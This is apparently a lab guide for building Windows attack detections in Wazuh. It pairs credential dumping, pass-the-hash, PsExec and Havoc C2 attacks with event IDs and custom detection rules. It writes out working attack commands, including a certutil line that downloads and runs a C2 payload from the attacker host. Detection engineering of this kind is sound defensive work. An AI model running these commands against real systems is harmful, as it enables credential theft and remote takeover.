# Part 2 — Windows Attacks & Wazuh Rules

---

## Wazuh Setup

```bash
# Single-node Docker install
git clone https://github.com/wazuh/wazuh-docker.git -b v4.7.3
cd wazuh-docker/single-node
docker compose up -d
```

Dashboard: `https://<WAZUH_IP>` — admin / SecretPassword

---

## Windows Agent Install

Run in PowerShell as Administrator on each VM:

```powershell
Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.3-1.msi -OutFile wazuh-agent.msi
msiexec.exe /i wazuh-agent.msi /q WAZUH_MANAGER="<WAZUH_IP>" WAZUH_AGENT_NAME="Win-VM1"
Start-Service WazuhSvc
```

---

## Enable Audit Policies (required)

Run on both Windows VMs before doing anything else:

```powershell
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
auditpol /set /subcategory:"Security System Extension" /success:enable /failure:enable
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1 -Force
```

---

## Key Event IDs

| ID | Event | Notes |
|---|---|---|
| 4624 | Successful logon | Check Logon Type |
| 4625 | Failed logon | Brute force |
| 4648 | Logon with explicit credentials | PSExec, RunAs |
| 4672 | Special privileges assigned | Admin logon |
| 4688 | New process created | Needs audit policy |
| 4697 | Service installed | PSExec, persistence |
| 7045 | New service (System log) | PSExec |
| 4776 | NTLM credential validation | PTH, secretsdump |
| 4698 | Scheduled task created | Persistence |

**Logon Types**
- 2 = interactive (local)
- 3 = network (SMB) — PTH shows up here
- 10 = RDP

---

## Attack 1 — Credential Dumping (secretsdump)

```bash
impacket-secretsdump Administrator:'Password123'@<WIN_VM1_IP>
# Copy the NT hash: the part after the third colon
```

Events: 4624 (Type 3), 4776

```
data.win.system.eventID: 4776
```

---

## Attack 2 — Pass the Hash (CrackMapExec)

```bash
crackmapexec smb <WIN_VM2_IP> -u Administrator -H <NT_HASH>
crackmapexec smb <WIN_VM2_IP> -u Administrator -H <NT_HASH> -x "whoami"
```

Events: 4624 (Type 3, NTLM), 4648, 4672

PTH signature in logs:
- LogonType = 3
- AuthenticationPackageName = NTLM
- WorkstationName = attacker machine
- IpAddress = attacker IP

```
data.win.system.eventID: 4624 AND data.win.eventdata.logonType: 3 AND data.win.eventdata.authenticationPackageName: NTLM
```

---

## Attack 3 — Remote Execution (PSExec)

```bash
impacket-psexec Administrator:'Password123'@<WIN_VM1_IP>
impacket-psexec -hashes :NT_HASH Administrator@<WIN_VM1_IP>
```

Events: 7045 (PSEXESVC service), 4697, 4624, 4688

```
data.win.eventdata.serviceName: PSEXESVC
data.win.system.eventID: 7045
```

---

## Attack 4 — Havoc C2

```bash
# Start team server
cd /opt/havoc
sudo ./havoc server --profile ./profiles/havoc.yaotl -v

# Open client in second terminal
./havoc client
```

In Havoc client:
1. View → Listeners → Add — HTTP, set Host to `<KALI_IP>`
2. Attack → Payload → Generate — Windows EXE
3. Save output as `demon.exe`

```bash
# Host the payload
python3 -m http.server 8080 --directory /tmp/
```

On Windows VM (cmd as Admin):
```cmd
certutil -urlcache -split -f http://<KALI_IP>:8080/demon.exe C:\Windows\Temp\demon.exe
C:\Windows\Temp\demon.exe
```

Events: 4688 (certutil with urlcache), 4688 (demon.exe from cmd.exe), 4697 if persistence

```
data.win.eventdata.commandLine: *certutil* AND data.win.eventdata.commandLine: *urlcache*
```

---

## Wazuh Detection Rules

Add to `/var/ossec/etc/rules/local_rules.xml`, then:
```bash
sudo systemctl restart wazuh-manager
```

```xml
<group name="windows,attack,">

  <rule id="100001" level="12">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4624$</field>
    <field name="win.eventdata.logonType">^3$</field>
    <field name="win.eventdata.authenticationPackageName">NTLM</field>
    <description>Possible Pass-the-Hash: NTLM network logon</description>
    <mitre><id>T1550.002</id></mitre>
  </rule>

  <rule id="100002" level="10" frequency="5" timeframe="30">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4625$</field>
    <same_field>win.eventdata.ipAddress</same_field>
    <description>Brute force: 5+ failed logons in 30s from same IP</description>
    <mitre><id>T1110</id></mitre>
  </rule>

  <rule id="100003" level="14">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^7045$</field>
    <field name="win.eventdata.serviceName">PSEXESVC</field>
    <description>PSExec service installed</description>
    <mitre><id>T1569.002</id></mitre>
  </rule>

  <rule id="100004" level="12">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4688$</field>
    <field name="win.eventdata.newProcessName">certutil.exe</field>
    <field name="win.eventdata.commandLine">urlcache</field>
    <description>Certutil used to download file - possible payload delivery</description>
    <mitre><id>T1105</id></mitre>
  </rule>

  <rule id="100005" level="12" frequency="10" timeframe="10">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4776$</field>
    <same_field>win.eventdata.workstationName</same_field>
    <description>Multiple NTLM validations - possible credential dumping</description>
    <mitre><id>T1003.002</id></mitre>
  </rule>

</group>
```
